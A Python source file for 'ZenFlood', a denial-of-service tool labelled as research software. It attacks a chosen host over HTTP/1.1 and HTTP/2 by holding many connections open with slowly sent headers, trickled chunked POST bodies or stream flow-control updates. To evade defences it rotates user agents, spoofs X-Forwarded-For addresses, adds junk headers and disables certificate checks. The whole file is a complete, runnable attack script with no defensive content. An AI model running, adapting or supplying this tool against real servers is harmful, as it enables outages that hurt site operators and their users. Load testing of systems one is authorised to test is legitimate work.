#!/usr/bin/env python3

"""
 ________                      ________  __                            __
/        |                    /        |/  |                          /  |
$$$$$$$$/   ______   _______  $$$$$$$$/ $$ |  ______    ______    ____$$ |
    /$$/   /      \ /       \ $$ |__    $$ | /      \  /      \  /    $$ |
   /$$/   /$$$$$$  |$$$$$$$  |$$    |   $$ |/$$$$$$  |/$$$$$$  |/$$$$$$$ |
  /$$/    $$    $$ |$$ |  $$ |$$$$$/    $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 /$$/____ $$$$$$$$/ $$ |  $$ |$$ |      $$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |
/$$      |$$       |$$ |  $$ |$$ |      $$ |$$    $$/ $$    $$/ $$    $$ |
$$$$$$$$/  $$$$$$$/ $$/   $$/ $$/       $$/  $$$$$$/   $$$$$$/   $$$$$$$/

ZenFlood - Multi-Protocol, Adversarial SlowHTTP Testing Tool
By SnailSploit/ Kai Aizen.
"""

import argparse, logging, random, socket, sys, time, ssl, threading
from collections import deque

DEFAULT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

def build_headers(host, rand=True, fake_count=2):
    base = [
        ("Host", host),
        ("User-Agent", random.choice(DEFAULT_UAS)),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Cache-Control", "no-cache"),
    ]
    fake_headers = [
        ("X-Request-ID", str(random.randint(100000, 999999))),
        ("X-Forwarded-For", ".".join(str(random.randint(1, 255)) for _ in range(4))),
    ] + [("X-Fake-" + str(i), f"Value{random.randint(1000, 9999)}") for i in range(fake_count)]
    headers = base + fake_headers if rand else base
    random.shuffle(headers)
    return headers

def slowloris_http1(host, port, ssl_on, attack_mode, header_jitter, payload_jitter, log_queue, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        if ssl_on:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        if attack_mode == "get":
            s.send(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n".encode())
        else:
            s.send(b"POST / HTTP/1.1\r\n")
            s.send(b"Transfer-Encoding: chunked\r\n")

        headers = build_headers(host, rand=True, fake_count=3)
        for k, v in headers:
            s.send(f"{k}: {v}\r\n".encode())
            time.sleep(random.uniform(*header_jitter))

        s.send(b"\r\n")

        while not stop_event.is_set():
            if attack_mode == "get":
                s.send(f"X-Keep-Alive: {random.randint(1, 999999)}\r\n".encode())
            else:
                chunk = "%x\r\n%s\r\n" % (random.randint(10, 32), "A"*random.randint(10,32))
                s.send(chunk.encode())
            try:
                s.settimeout(0.5)
                resp = s.recv(2048)
                if resp:
                    log_queue.append(resp[:100])
            except socket.timeout:
                pass
            except Exception as e:
                log_queue.append(f"[CLOSED]: {e}".encode())
                break
            time.sleep(random.uniform(*payload_jitter))
        s.close()
    except Exception as e:
        log_queue.append(f"[INIT FAIL]: {e}".encode())

def slowloris_http2(host, port, ssl_on, header_jitter, payload_jitter, log_queue, stop_event):
    try:
        from h2.connection import H2Connection
        from h2.events import ResponseReceived, DataReceived

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        if ssl_on:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        conn = H2Connection()
        conn.initiate_connection()
        s.sendall(conn.data_to_send())

        stream_id = conn.get_next_available_stream_id()
        headers = [
            (':method', 'GET'),
            (':authority', host),
            (':scheme', 'https' if ssl_on else 'http'),
            (':path', '/'),
        ] + [(k, v) for k, v in build_headers(host, rand=True, fake_count=4)]
        conn.send_headers(stream_id, headers, end_stream=False)
        s.sendall(conn.data_to_send())

        while not stop_event.is_set():
            conn.increment_flow_control_window(1024, stream_id=stream_id)
            s.sendall(conn.data_to_send())
            try:
                s.settimeout(0.5)
                resp = s.recv(4096)
                if resp:
                    log_queue.append(resp[:100])
            except socket.timeout:
                pass
            except Exception as e:
                log_queue.append(f"[H2 CLOSED]: {e}".encode())
                break
            time.sleep(random.uniform(*payload_jitter))
        s.close()
    except Exception as e:
        log_queue.append(f"[H2 INIT FAIL]: {e}".encode())

def launch_attack(args):
    log_queue = deque(maxlen=200)
    stop_event = threading.Event()
    threads = []
    for _ in range(args.sockets):
        if args.http2:
            t = threading.Thread(target=slowloris_http2,
                args=(args.host, args.port, args.https, (args.header_jitter_min, args.header_jitter_max),
                    (args.payload_jitter_min, args.payload_jitter_max), log_queue, stop_event))
        else:
            t = threading.Thread(target=slowloris_http1,
                args=(args.host, args.port, args.https, args.mode, (args.header_jitter_min, args.header_jitter_max),
                    (args.payload_jitter_min, args.payload_jitter_max), log_queue, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    try:
        while True:
            time.sleep(3)
            print(f"[+] Active sockets: {len(threads)} | Recent log: {list(log_queue)[-1:]}")
    except KeyboardInterrupt:
        print("\n[!] Interrupt detected, shutting down...")
        stop_event.set()
        for t in threads: t.join(2)
        print("[!] Attack ended.")

def parse_args():
    p = argparse.ArgumentParser(description="ZenFlood: HTTP/1.1 & HTTP/2 SlowHTTP Research Tool")
    p.add_argument("host", help="Target host (IP or domain)")
    p.add_argument("-p", "--port", default=443, type=int, help="Target port (default: 443 for HTTPS)")
    p.add_argument("-s", "--sockets", default=100, type=int, help="Number of sockets/streams")
    p.add_argument("--https", action="store_true", help="Use SSL/TLS (default port 443)")
    p.add_argument("--http2", action="store_true", help="Enable HTTP/2 mode (default: HTTP/1.1)")
    p.add_argument("--mode", choices=["get", "post"], default="get", help="Attack mode: get (Slowloris) or post (Slow POST/Chunked)")
    p.add_argument("--header-jitter-min", type=float, default=1.0, help="Header send jitter min (seconds)")
    p.add_argument("--header-jitter-max", type=float, default=3.0, help="Header send jitter max (seconds)")
    p.add_argument("--payload-jitter-min", type=float, default=8.0, help="Payload/keepalive jitter min (seconds)")
    p.add_argument("--payload-jitter-max", type=float, default=15.0, help="Payload/keepalive jitter max (seconds)")
    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()
    launch_attack(args)
